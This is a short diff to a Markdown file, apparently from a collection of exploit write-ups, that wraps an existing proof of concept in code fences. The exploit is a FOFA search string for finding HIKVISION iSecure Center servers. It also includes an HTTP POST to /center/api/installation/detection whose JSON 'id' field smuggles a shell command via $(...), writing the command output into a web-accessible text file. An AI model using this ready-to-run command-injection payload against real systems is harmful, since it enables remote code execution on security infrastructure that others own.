@@ -78,6 +78,7 @@ FOFA：app="HIKVISION-iSecure-Center"
 
 POC/EXP：
 
+```
 POST /center/api/installation/detection HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
@@ -88,6 +89,8 @@ Connection: close
 Content-Type: application/json;charset=UTF-8
 
 {"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/ceshi.txt)"}}
+```
+
 
 把命令执行结果写入txt文件
 
